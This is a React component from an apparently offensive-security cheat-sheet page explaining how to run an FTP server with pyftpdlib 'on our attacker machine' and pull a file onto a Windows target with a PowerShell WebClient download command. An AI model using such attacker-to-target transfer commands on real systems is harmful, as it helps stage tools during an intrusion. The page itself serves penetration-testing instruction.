import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const FT_FTP = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
                <Typography variant="h6">
              Description
              </Typography>
              <Typography>
              We can setup an FTP server using `pyftpdlib` on our attacker machine to transfer files.
              </Typography>
              <Box pt={5}></Box>
              <Typography variant="h6">
              Step 1 - Linux
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'sudo pip3 install pyftpdlib'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
              Step 2 - Linux
              </Typography>
              <Typography>
              By default, `pyftpdlib` uses port 2121. We can specify port 21 if prefered.
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'sudo python3 -m pyftpdlib --port 21'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 3 - Windows
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"(New-Object Net.WebClient).DownloadFile('ftp://{IP}/file.txt', 'ftp-file.txt')"}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default FT_FTP;
  